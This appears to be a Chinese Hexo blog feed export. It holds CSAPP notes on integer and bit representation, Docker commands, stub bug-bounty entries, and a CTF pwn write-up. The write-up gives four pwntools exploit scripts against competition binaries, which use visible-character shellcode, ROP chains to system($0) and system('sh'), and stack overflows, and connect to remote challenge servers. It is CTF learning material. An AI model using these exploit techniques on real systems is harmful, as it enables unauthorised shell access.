    <content type="html"><![CDATA[<h1 id="CSAPP第二章总览"><a href="#CSAPP第二章总览" class="headerlink" title="CSAPP第二章总览"></a>CSAPP第二章总览</h1><h1 id="视频学习与思考"><a href="#视频学习与思考" class="headerlink" title="视频学习与思考"></a>视频学习与思考</h1><h2 id="数字的位级表示"><a href="#数字的位级表示" class="headerlink" title="数字的位级表示"></a>数字的位级表示</h2><p>​——everything is bits</p><p>&#x3D;&#x3D;用有限的位组合形式表示在数域中无限扩张的数&#x3D;&#x3D;<br>bit is 0 or 1</p><p>4 bits可表示为十六进制</p><p>二进制清晰稳定，简单易存储</p><blockquote><p>1010</p><p>1011B</p><p>1100</p><p>1101D</p><p>1110</p><p>1111F</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181956146.png" alt="image-20230814212956178"></p><h3 id="位级运算"><a href="#位级运算" class="headerlink" title="位级运算"></a>位级运算</h3><h4 id="关于布尔代数"><a href="#关于布尔代数" class="headerlink" title="关于布尔代数"></a>关于布尔代数</h4><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181956147.png" alt="image-20230827153125187"></p><h3 id="位操作："><a href="#位操作：" class="headerlink" title="位操作："></a>位操作：</h3><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181956148.png" alt="image-20230827214555101"></p><p>如上，当我们操作连续的bits时,可看作是对每个比特位进行布尔操作</p><p>你可以直接在C语言中执行这些低级别的位操作</p><p>*虚拟电子空间是由机器字长决定的</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181956149.png" alt="image-20230827222149352">上例是一种隐式的表示数值集合的方式：<br>对这些位进行从右向左编号，1的位置表示这个位置上所代表的数字在此集合中，0则表示不在</p><p>从上图中可以看出：</p><blockquote><p>&amp; 类似集合的交</p><p>| 类似集合的并</p><p>^ 类似集合的异或并</p><p>~ 类似集合的补集</p></blockquote><p>位表示集合</p><p>注意区分&amp;和&amp;&amp;，|和||，~和！，前者是位操作，后者是条件判断</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181956150.png" alt="image-20230828212258968"></p><p>最后一行可以测试空指针，如果是0或null，就能避免对空指针的访问</p><h3 id="位移"><a href="#位移" class="headerlink" title="位移"></a>位移</h3><h4 id="左移"><a href="#左移" class="headerlink" title="左移"></a>左移</h4><p>位整体向左移w位（前w位抹去，后补w个零）</p><h4 id="右移"><a href="#右移" class="headerlink" title="右移"></a>右移</h4><blockquote><p>逻辑右移</p></blockquote><p>位整体向右移w位（前w位补零，后w位抹去）</p><blockquote><p>算术右移</p></blockquote><p>位整体向右移w位（前w+1位若为1，前w位补1，否则补零；后w位抹去）</p><p>**PS:**实际上位移量是通过计算kmod </p><p>​w得到的。不过&#x3D;&#x3D;这种行为对于C程序来说是没有保证的&#x3D;&#x3D;，所以应该保持位移量小于待移位值的位数。另一方面，Java特别要求位移数量应该按照我们前面所讲的求模的方法来计算。</p><p>&#x3D;&#x3D;向左移动负数可能会导致结果逻辑右移&#x3D;&#x3D;</p><h2 id="整数表示"><a href="#整数表示" class="headerlink" title="整数表示"></a>整数表示</h2><h3 id="无符号数"><a href="#无符号数" class="headerlink" title="无符号数"></a>无符号数</h3><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181956151.png" alt="image-20230902173853207"></p><p>无符号数的二进制表示有一个很重要的属性，也就是每个介于0～2^n-1之间的数都有唯一一个n位的值编码。</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181956152.png" alt="image-20230902164616049"></p><h3 id="补码"><a href="#补码" class="headerlink" title="补码"></a>补码</h3><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181956153.png" alt="image-20230902192527599"></p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181956154.png" alt="image-20230902193928478"></p><blockquote><p>补码范围不对称</p><p>C语言用补码表示有符号整数</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181956155.png" alt="image-20230902194424919"></p><p>最高位有时称为符号位，在补码中，如果它为1，就是负数。</p><p>所有位为1的是-1</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181956156.png" alt="image-20230902195114055"></p><p>|TMax|&#x3D;|TMin|-1</p><p>因为-TMin&#x3D;TMax+1&#x3D;0x7FFF+1&#x3D;0x8000&#x3D;TMin</p><p>所以&#x3D;&#x3D;-TMin&#x3D;TMin&#x3D;&#x3D;</p><p>UMax&#x3D;2*TMax+1</p><p>&#x3D;&#x3D;int 会被转换为 unsigned！！！&#x3D;&#x3D;</p><p>i-sizeof(int)&gt;&#x3D;0 是无符号之间的比较</p><p><strong>补码的产生：</strong></p><p>计算机的<a href="https://so.csdn.net/so/search?q=ALU&spm=1001.2101.3001.7020">ALU</a>是由加法单元实现的，而加法只会产生进位，而不需要考虑借位。而我们现实中的减法运算则会产生借位操作。因此在实现减法的时候为了复用加法器，让加法器可以执行减法操作，就需要消除想办法消除减法的借位行为。</p><p>而最大的数在进行减法运算时刚好不需要借位，因此我们在进行减法运算的时候先加一个最大的数(我们假设为MAX)，再减去一个最大的数，然后根据结合率，我们先使用最大的数与减数进行计算，将结果与被减数相加，就可以消除减数与被减数之间的借位了，但是最后减去MAX的时候还是会产生借位。因此我们考虑MAX + 1，因为MAX进位后产生的是1个1，剩余的全是0，这样就可以把借位全部消除了。&#x3D;&#x3D;？&#x3D;&#x3D;<br>因此A - B 就转换为 A +（MAX - B）+ 1 - (MAX + 1)的形式。</p><p>MAX-B就叫做X的补码(X为该进制下的最大数字，比如二进制下X为1，十进制下X为9)，即如果是在十进制下计算A-B，则MAX-B的结果叫做B对9的补码，如果是二进制下计算，则MAX-B的结果叫做B对1的补码。</p><p>‘10’后面跟位数-1个0是MAX + 1的结果，所以&#x3D;&#x3D;MAX-B + 1叫做B对‘10’的补码&#x3D;&#x3D;，也就是我们在计算机课本中常见的补码的概念。</p><p>由于二进制的特殊性，二进制下MAX-B可以简单的转换为将B的各位取反，因此二进制下”补码”的计算，是将B的各位取反后加1。</p><p>由上面的分析我们可以知道B的”补码”可以当作-B来使用，只要在最后减去一个MAX+1即可，即在三位下最后减去‘1000’，四位下减去‘10000’。</p><p>但在上面需要注意，如果被减数小于减数，即产生一个为负的结果时， A +（MAX - B）+ 1 位数与原来相同，而 (MAX + 1)是多一位的，例如100-150， 100 +（999 - 150）+ 1结果是950，而 (999 + 1)是1000，此时虽然950与000的计算不需要借位，但是1000比950多了一个最高位，因此还是需要借位才能继续运算。</p><p>在这种情况下，我们再更换一下思路，使用减数减去被减数，得到结果再取负即可。即将A-B转换为B-A，再用上面的方式来消除借位。</p><p><strong>补码的应用：</strong></p><p>补码可以表示负数，因此8位二进制所表示的256种变化中有一半要用于去表示补码，即负数。而最高为1之后的数字刚好是128-256，因此这部分表示为补码的话刚好是127-1的补码，因此00000001-01111111的含义不变，表示1-127，而10000000-11111111的含义变为其所表示的补码的含义，即-128到-1(需要减100000000)，00000000表示0。</p><p><strong>最重要的是，由于计算机只能存储8位，所以<code>MAX + 1</code>超出8位限制，因此相当于减<code>00000000</code>，所以在计算机内可以直接补码视为负数，而不需要再去减<code>MAX+1</code>，因为此时MAX + 1相当于计算机中的0，虽然在现实中相当于10000。</strong>（溢出）</p><blockquote><p>C语言标准只指定了每种数据类型的最小范围，而不是确定的范围。虽然我们可以选择与大多数机器上的标准表示兼容的数据类型，但是这也不能保证可移植性。</p><p>使用宏能保证：不论代码是如何被编译的，都能生成正确的格式字符串。</p><p>Java标准是非常明确的。它要求采用补码表示，取值范围与图2-10中64位的情况一样。</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181956157.png" alt="image-20230902205959672">在Java中，单字节数据类型称为byte,而不是char。这些非常具体的要求都是为了保证无论在什么机器上运行，Java程序都能表现地完全一样。</p><p>C和C++有无符号都支持，Java只支持有符号数</p></blockquote><h3 id="有无符号数之间的转换"><a href="#有无符号数之间的转换" class="headerlink" title="有无符号数之间的转换"></a>有无符号数之间的转换</h3><p>C语言允许在各种不同的数字数据类型之间做强制类型转换。C是少数unsigned是明确的数据类型的语言之一</p><p>强制类型转换的结果保持位值不变，只是改变了解释这些位的方式。</p><p>-12345的16位补码表示与53191的16位无符号表示是完全一样的。将short强制类型转换为unsigned short改变数值，但是不改变位表示。</p><p>无符号形式的4294967295(UMax32)和补码形式的-1的位模式是完全一样的。将unsigned强制类型转换成int,底层的位表示保持不变。</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181956158.png" alt="image-20230903155143087"></p><p><strong>1+UMax&#x3D;2^w</strong></p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181956159.png" alt="image-20230902211451667"></p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181956160.png" alt="image-20230902211549246"></p><p>对于在范围O≤x≤TMaxw之内的值x而言，我们得到T2Uv(x)&#x3D;x和U2Tw(x)&#x3D;x。也就是说，在这个范围内的数字有相同的无符号和补码表示。对于这个范围以外的数值，转换需要加上或者减去2^w。</p><h3 id="关于C语言中的整数问题"><a href="#关于C语言中的整数问题" class="headerlink" title="关于C语言中的整数问题"></a>关于C语言中的整数问题</h3><p>大多数数字都默认为是有符号的。例如，当声明一个像12345或者0x1A2B这样的常量时，这个值就被认为是有符号的。要创建一个无符号常量，必须加上后缀字符‘u’或者‘u’,例如，12345U或者0x1A2Bu。</p><p>在一台采用补码的机器上，当从无符号数转换为有符号数时，效果就是应用函数U2Tw,而从有符号数转换为无符号数时，就是应用函数T2U,其中w表示数据类型的位数</p><p>&#x3D;&#x3D;当执行一个运算时，如果它的一个运算数是有符号的而另一个是无符号的，那么C语言会隐式地将有符号参数强制类型转换为无符号数，并假设这两个数都是非负的，来执行这个运算。&#x3D;&#x3D;就像我们将要看到的，这种方法对于标准的算术运算来说并无多大差异，但是对于像&lt;和&gt;这样的关系运算符来说，它会导致非直观的结果。</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181956161.png" alt="image-20230902213240337"></p><p><strong>首先判断数有无符号，避免隐式转换</strong></p><p>如果用无符号的0与-1比较，会得到相反的结果</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181956162.png" alt="image-20230903161417562"></p><h3 id="扩展位数"><a href="#扩展位数" class="headerlink" title="扩展位数"></a>扩展位数</h3><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181956163.png" alt="image-20230902213410555"></p><p>1110&#x3D;&#x3D;&#x3D;-8&#x3D;&#x3D;+4+2&#x3D;-2</p><p>11110&#x3D;&#x3D;&#x3D;-16+8&#x3D;&#x3D;+…&#x3D;-2</p><p>……</p><h3 id="数字截断"><a href="#数字截断" class="headerlink" title="数字截断"></a>数字截断</h3><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181956164.png" alt="image-20230902215010672"></p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181956165.png" alt="image-20230902215036686"></p><p>截断补码要关注第一位的0 1区别</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181956166.png" alt="image-20230902215107909"></p><h3 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h3><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181956167.png" alt="image-20230902215212072"></p><p>避免这类错误的一种方法就是绝不使用无符号数。实际上，除了C以外很少有语言支持无符号整数。</p><p>Java只支持有符号整数，并且要求以补码运算来实现。正常的右移运算符&gt;&gt;被定义为执行算术右移。特殊的运算符&gt;&gt;&gt;被指定为执行逻辑右移。</p><p>当我们想要把字仅仅看做是位的集合而没有任何数字意义时，无符号数值是非常有用的。例如，往一个字中放入描述各种布尔条件的标记(flag)时，就是这样。地址自然地就是无符号的，所以系统程序员发现无符号类型是很有帮助的。当实现模运算和多精度运算的数学包时，数字是由字的数组来表示的，无符号值也会非常有用。</p><h2 id="整数运算"><a href="#整数运算" class="headerlink" title="整数运算"></a>整数运算</h2><p>计算机的有限性会导致当数字大到所能表示的最大值后，就会溢出</p><h3 id="无符号加法"><a href="#无符号加法" class="headerlink" title="无符号加法"></a>无符号加法</h3><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181956168.png" alt="image-20230904171432434"></p><p>简单来说就是当产生溢出时会丢弃最高位（截断），程序没有任何异常</p><p>本质为模运算</p><h3 id="补码加法"><a href="#补码加法" class="headerlink" title="补码加法"></a>补码加法</h3><p>不发生溢出的情况下，正常进行运算就可以获得正确的结果；发生溢出，负数相加可能获得正数或其他任何数</p><p>正数相加会得到负数</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181956169.png" alt="image-20230904172840961"></p><p><strong>运算溢出（空间耗尽）</strong></p><p>50000*50000&#x3D;？ </p><h2 id="浮点数-float"><a href="#浮点数-float" class="headerlink" title="浮点数(float)"></a>浮点数(float)</h2><h3 id="近似表示（舍入问题）"><a href="#近似表示（舍入问题）" class="headerlink" title="近似表示（舍入问题）"></a>近似表示（舍入问题）</h3><p>1e20-(1e20+3.14)&#x3D;0</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181956170.png" alt="image-20230813185230962"></p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181956171.png" alt="image-20230813190046952"></p><p> 易写出非法的代码</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181956172.png" alt="image-20230813153016202"></p><p>不同的内存访问模式对计算机性能优化有巨大效果（与内存层次结构的缓存有关）</p><h1 id="课后习题要点"><a href="#课后习题要点" class="headerlink" title="课后习题要点"></a>课后习题要点</h1><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
      <category>pwn前置知识</category>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctf_xined实战与避坑</title>
    <link href="/2023/08/26/Docker/ctf-xined%E5%AE%9E%E6%88%98%E4%B8%8E%E9%81%BF%E5%9D%91/"/>
    <url>/2023/08/26/Docker/ctf-xined%E5%AE%9E%E6%88%98%E4%B8%8E%E9%81%BF%E5%9D%91/</url>
    
    <content type="html"><![CDATA[<h1 id="ctf-xined-实操"><a href="#ctf-xined-实操" class="headerlink" title="ctf_xined 实操"></a>ctf_xined 实操</h1><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><blockquote><p>docker build -t “elf_name:18.04” .</p><p>#推荐加上环境版本</p><p>docker run -d -p 0.0.0.0:7777:9999 elf_name:18.04</p><p>#此命令开启端口为“0.0.0.0:7777”</p></blockquote><h2 id="容器关闭、删除"><a href="#容器关闭、删除" class="headerlink" title="容器关闭、删除"></a>容器关闭、删除</h2><blockquote><p>docker ps -a#显示所有容器</p><p>docker stop XXX#停止正在运行的容器</p><p>docker rm XXX#删除镜像</p></blockquote><h1 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h1><h2 id="docker安装及部署"><a href="#docker安装及部署" class="headerlink" title="docker安装及部署"></a>docker安装及部署</h2>]]></content>
    
    
    <categories>
      
      <category>软件</category>
      
      <category>Docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件介绍</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>4.水平</title>
    <link href="/2023/08/26/src%E5%85%A5%E9%97%A8/4-%E6%B0%B4%E5%B9%B3&amp;%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/"/>
    <url>/2023/08/26/src%E5%85%A5%E9%97%A8/4-%E6%B0%B4%E5%B9%B3&amp;%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>src入门</category>
      
    </categories>
    
    
    <tags>
      
      <tag>src</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>3.条件竞争</title>
    <link href="/2023/08/26/src%E5%85%A5%E9%97%A8/3-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/"/>
    <url>/2023/08/26/src%E5%85%A5%E9%97%A8/3-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>src入门</category>
      
    </categories>
    
    
    <tags>
      
      <tag>src</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2.弱口令</title>
    <link href="/2023/08/26/src%E5%85%A5%E9%97%A8/2-%E5%BC%B1%E5%8F%A3%E4%BB%A4/"/>
    <url>/2023/08/26/src%E5%85%A5%E9%97%A8/2-%E5%BC%B1%E5%8F%A3%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h1><p>容易猜到，可爆破的口令</p><h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>src入门</category>
      
    </categories>
    
    
    <tags>
      
      <tag>src</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>1.信息收集</title>
    <link href="/2023/08/26/src%E5%85%A5%E9%97%A8/1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <url>/2023/08/26/src%E5%85%A5%E9%97%A8/1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>src入门</category>
      
    </categories>
    
    
    <tags>
      
      <tag>src</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>8.19_WP</title>
    <link href="/2023/08/19/WP/%E5%86%85%E9%83%A8%E8%B5%9B/8.19_WP/"/>
    <url>/2023/08/19/WP/%E5%86%85%E9%83%A8%E8%B5%9B/8.19_WP/</url>
    
    <content type="html"><![CDATA[<h1 id="login"><a href="#login" class="headerlink" title="login"></a>login</h1><p>[CISCN 2022]login-normal</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>首先看看保护</p><p><img src="/../../../images/8.19_WP/image-20230819142230080.png" alt="image-20230819142230080"></p><p>保护全开。。。</p><p>进入IDA中</p><p>题目的关键在于能否看懂sub_FFD函数做了什么</p><p>下面的这一段功能是告诉我们命令的匹配方法</p><p><img src="/../../../images/8.19_WP/image-20230819183644871.png" alt="image-20230819183644871"></p><p><img src="/../../../images/8.19_WP/image-20230819183754813.png" alt="image-20230819183754813"></p><p>opt:v7\n+msg:dest\n<br>只有匹配到这种格式的才是合法的命令，不然就会报错退出。<br>需要注意的是，由于从nptr复制到dest的时候传输的字节数是nptr的长度减1，因此需要多传一个无用的字节才能使得正确的msg成为dest。</p><p>漏洞点：</p><p><img src="/../../../images/8.19_WP/image-20230819184856943.png" alt="image-20230819184856943"></p><p>当v7为2时就会调用这个函数，它会检测两个全局变量的值是否为1，如果都为1就会将dest的内容作为shellcode执行。因此我们需要传入一个可视字符的shellcode。<br>而要改变这两个全局变量，就要先执行v7为1时对应的一个函数，要求dest指向的内容为ro0t即可改变这两个变量。</p><p><img src="/../../../images/8.19_WP/image-20230819185004441.png" alt="image-20230819185004441"></p><p>难度主要在代码审计上</p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <br><span class="hljs-comment">#io=process(&quot;./login&quot;)</span><br>io=remote(<span class="hljs-string">&#x27;182.92.176.248&#x27;</span>,<span class="hljs-number">1111</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./login&#x27;</span>)<br> <br>shellcode=<span class="hljs-string">&#x27;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span><br>payload1=<span class="hljs-string">&#x27;opt:1\nmsg:ro0ta\n&#x27;</span>   <span class="hljs-comment">#a来占位，1对应case1的情况</span><br>payload2=<span class="hljs-string">&#x27;opt:2\n&#x27;</span>+<span class="hljs-string">&#x27;msg:&#x27;</span>+shellcode+<span class="hljs-string">&#x27;\r\n&#x27;</span>   <span class="hljs-comment">#\r占位，2对应case2</span><br> <br>io.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&gt; &#x27;</span>,payload1)<br>io.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&gt; &#x27;</span>,payload2)<br> <br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="where-is-shell"><a href="#where-is-shell" class="headerlink" title="where_is_shell"></a>where_is_shell</h1><h2 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a>过程</h2><p>首先看看保护</p><p><img src="/../../../images/8.19_WP/image-20230819142045580.png" alt="image-20230819142045580"></p><p>进入IDA中</p><p>文件本身很简单</p><p>代码段是有r权限的，但是却并没有找到&#x2F;bin&#x2F;sh字符串，同时题目给出了一个tips，那么就需要到tips里面找字符串</p><p>**system的参数不一定必须是“&#x2F;bin&#x2F;sh”,system($0) **</p><p><strong>‘$0’ 代表当前运行的命令名，一般用于脚本中。</strong></p><p><strong>$0在机器码中为 \x24\x30</strong></p><p><img src="/../../../images/8.19_WP/image-20230819183044670.png" alt="image-20230819183044670"></p><p>在<code>0x400541</code>处找到了<code>\x24\x30</code>即<code>$0</code>,直接<code>system($0)</code>就能拿到shell（可以用D快捷键来查看）</p><h2 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#io = process(&#x27;./shell&#x27;)</span><br>io = remote(<span class="hljs-string">&#x27;182.92.176.248&#x27;</span>,<span class="hljs-number">2222</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./shell&#x27;</span>)<br><br>ret_addr = <span class="hljs-number">0x400416</span> <br>pop_rdi_ret = <span class="hljs-number">0x4005e3</span> <br>tips = <span class="hljs-number">0x400541</span><br>system_addr = elf.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(ret_addr)+p64(pop_rdi_ret)+p64(tips)+p64(system_addr)<br><br>io.sendlineafter(<span class="hljs-string">&#x27;find it?\n&#x27;</span>,payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="qiandaoa"><a href="#qiandaoa" class="headerlink" title="qiandaoa"></a>qiandaoa</h1><h2 id="过程-2"><a href="#过程-2" class="headerlink" title="过程"></a>过程</h2><p>首先看看保护</p><p><img src="/../../../images/8.19_WP/image-20230819142202559.png" alt="image-20230819142202559"></p><p>进入IDA中</p><p><img src="/../../../images/8.19_WP/image-20230819180347777.png" alt="image-20230819180347777"></p><p>乍一看很复杂</p><p>发现s1是48字节,但是scanf读入100,存在溢出点</p><p>进入getflag函数</p><p><img src="/../../../images/8.19_WP/image-20230819180502552.png" alt="image-20230819180502552"></p><p>他说flag就是log</p><p><img src="/../../../images/8.19_WP/image-20230819180615988.png" alt="image-20230819180615988"></p><p>那么case 1,添加一个log,然后case 4去get flag</p><p>程序有system函数，但是没有&#x2F;bin&#x2F;sh字符串</p><p><strong>system的参数不一定必须是“&#x2F;bin&#x2F;sh”，单独的“sh”有时也可以拿到shell</strong>（涨知识了）</p><p>接下来就是用ROPgadget构造ROP链</p><h2 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br> <br>io=remote(<span class="hljs-string">&quot;182.92.176.248&quot;</span>,<span class="hljs-number">8888</span>)<br><span class="hljs-comment">#io=process(&#x27;./qiandaoa&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./qiandaoa&#x27;</span>)<br><br>system_addr=elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>shell_addr=<span class="hljs-number">0x80482ea</span><br> <br>io.recvuntil(<span class="hljs-string">&#x27;Please input admin password:&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;administrator&#x27;</span>)<br> <br>io.recvuntil(<span class="hljs-string">&#x27;0.Exit\n:&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br> <br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x48</span>+<span class="hljs-number">4</span>)+p32(system_addr)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span>+p32(shell_addr)<br> <br>io.recvuntil(<span class="hljs-string">&#x27;Please input new log info:&#x27;</span>)<br>io.sendline(payload)<br> <br>io.recvuntil(<span class="hljs-string">&#x27;0.Exit\n:&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br> <br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="eaz-text"><a href="#eaz-text" class="headerlink" title="eaz_text"></a>eaz_text</h1><h2 id="过程-3"><a href="#过程-3" class="headerlink" title="过程"></a>过程</h2><p>首先看看保护</p><p><img src="/../../../images/8.19_WP/image-20230819163712747.png" alt="image-20230819163712747"></p><p>进入IDA中</p><p><img src="/../../../images/8.19_WP/image-20230819164534755.png" alt="image-20230819164534755"></p><p>发现后门函数</p><p><img src="/../../../images/8.19_WP/image-20230819164617778.png" alt="image-20230819164617778"></p><p><img src="/../../../images/8.19_WP/image-20230819165019303.png" alt="image-20230819165019303"></p><p>可以直接打过去</p><h2 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#io=process(&#x27;./ez_text&#x27;)</span><br>io=remote(<span class="hljs-string">&#x27;101.37.118.53&#x27;</span>,<span class="hljs-number">8686</span>)<br><br>binsh_addr=<span class="hljs-number">0x08048763</span><br>system_addr=<span class="hljs-number">0x0804831A</span><br>target=<span class="hljs-number">0x804863a</span><br><br>payload=<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x6c</span> + <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">4</span> + p32(target) <br><br>io.sendafter(<span class="hljs-string">&#x27;anything?&#x27;</span>,payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
      <category>pwn练习记录</category>
      
      <category>每周一练</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker使用</title>
    <link href="/2023/08/03/Docker/Docker%E4%BD%BF%E7%94%A8/"/>
    <url>/2023/08/03/Docker/Docker%E4%BD%BF%E7%94%A8/</url>
    
